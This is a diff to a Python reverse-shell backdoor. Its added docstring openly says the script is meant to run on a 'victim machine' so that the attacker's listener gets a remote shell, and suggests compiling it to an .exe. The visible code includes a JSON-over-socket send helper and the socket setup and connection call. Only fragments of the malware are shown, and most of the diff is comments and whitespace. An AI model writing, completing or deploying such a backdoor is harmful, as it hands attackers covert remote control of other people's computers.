@@ -3,7 +3,16 @@ import time
 import subprocess
 import json
 import os
+'''
 
+*This is the script which is intended to be run on the victim machine
+ ie. as soon as the script is executed...our listener grabs the reverse shell back onto
+the attackers machine.
+**This script should be compiled into an .exe for fuctionality
+***any comment is appreciated!
+refer Python Docs on the topic of socket for more understanding of the script.
+
+'''
 def reliable_send(data):
     jsondata = json.dumps(data)
     s.send(jsondata.encode())
@@ -65,6 +74,3 @@ def shell():
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
-
-
-
